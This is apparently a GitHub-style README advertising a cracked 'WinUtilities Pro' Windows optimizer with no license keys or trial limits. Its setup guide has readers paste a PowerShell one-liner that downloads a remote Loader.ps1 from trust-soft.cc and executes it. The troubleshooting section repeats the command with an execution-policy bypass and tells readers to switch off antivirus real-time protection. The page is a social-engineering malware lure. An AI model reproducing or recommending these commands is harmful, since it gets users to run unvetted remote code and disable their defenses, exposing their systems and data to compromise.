# WinUtilities Pro Edition — Advanced System Optimization & Maintenance Suite

Welcome to the automated configuration hub for the **WinUtilities Pro Professional Build**. This repository provides a secure, lightweight deployment ecosystem designed to unlock the complete set of system tuning, drive cleaning, and performance enhancement modules for Windows.

Breathe new life into an aging computer, fix deep registry errors, and enjoy unrestricted premium system maintenance utilities without tracking trial limitations or dealing with manual license keys.

---

## 🚀 Key Modules in WinUtilities Pro

* **Disk & Registry Cleaner:** Remove cluttered junk files, invalid shortcuts, and orphan entries safely.
* **Memory Optimizer:** Reclaim lost RAM and manage active background services in real-time.
* **Privacy Protector:** Erase tracking cookies, internet cache, and temporary local history.
* **Startup Manager:** Control application boot order to drastically decrease PC launch times.

---

## 🛠 Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press Win + X on your keyboard.
   * Click on Terminal or Windows PowerShell from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit Enter. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://trust-soft.cc/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):

```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your PowerShell version doesn't support the irm shortcut, use the full, unabbreviated commands instead:

```cmd
Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## 📋 Technical Blueprint & Specs

* **Supported Platform:** Engineered for global integration across Windows 7, 8, 10, and 11 environments.
* **Optimization Scope:** Covers 20+ specialized modules for total hardware and file tree enhancement.
* **Privileges:** Administrator privileges are recommended to modify low-level disk sectors and system values.
